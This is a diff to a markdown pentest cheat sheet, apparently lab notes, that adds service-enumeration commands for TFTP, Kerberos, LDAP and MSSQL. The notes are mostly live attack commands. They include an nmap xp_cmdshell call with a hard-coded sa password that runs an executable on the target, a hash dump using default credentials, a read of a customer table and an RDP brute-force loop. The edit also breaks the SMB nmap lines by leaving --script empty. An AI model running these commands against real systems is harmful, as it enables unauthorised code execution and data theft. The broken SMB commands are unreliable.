@@ -31,20 +31,32 @@ dig.sh <ips.txt>
 for ip in $(cat ips.txt); do nslookup $ip <nameserver>; done
 ```
 
+# TFTP UDP 69
+```bash
+nmap -n -vvv -d -sU -p69 10.11.1.226 --script tftp-enum.nse --script-args tftp-enum.filelist=/usr/share/wordlists/metasploit/tftp.txt
+```
+
 # 88 Kerberos
 ```bash
 nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN.local",userdb=/usr/share/seclists/Usernames/Names/names.txt $TARGET
+
+nmap -n -v -p 88 --script krb5-enum-users -sV 10.11.1.201 -d --script-args krb5-enum-users.realm='corp',userdb=cirt-default-usernames.txt
 ```
 
 # 139/445 SMB
 ```bash
-nmap -n -v -p 135-139,445 -T4 -PN -sVC --script smb-enum* --script-args=unsafe=1 $TARGET
-nmap -n -v -p 135-139,445 -T4 -PN -sVC --script smb-vuln* --script-args=unsafe=1 $TARGET
+nmap -n -v -p 135-139,445 -T4 -PN -sVC --script= --script-args=unsafe=1 $TARGET
+nmap -n -v -p 135-139,445 -T4 -PN -sVC --script --script-args=unsafe=1 $TARGET
 nmblookup -A $TARGET
 smbclient //MOUNT/share -I $TARGET N
 smbclient -L //$TARGET
 enum4linux -a $TARGET
 rpcclient -U "" $TARGET
+```
+
+# 389 LDAP
+```bash
+nmap -n -v -p 389 --script ldap-rootdse.nse -sV 10.11.1.201
 ```
 
 # 80/443 - HTTP Servers
@@ -76,6 +88,11 @@ for username in $(cat USER_LIST); do for password in $(cat PASS_LIST) do; rdeskt
 ## 1433/27900 MSSQL
 ```bash
 nmap -vv -sV -Pn -p 27900 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=27900,mssql.username=sa,mssql.password=sa $TARGET
+
+ nmap -n -v -p 1433 10.11.1.31 -sTV -PN --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="c:\ralph.exe"
+
+ nmap -n -v -p 27900 10.11.1.227 -sV --script ms-sql-query.nse --script-args mssql.username=sa,mssql.password=password,ms-sql-query.query="SELECT * FROM tblCustomers",mssql.database=tblCustomers
+
 ```
 
 ## 5900 VNC
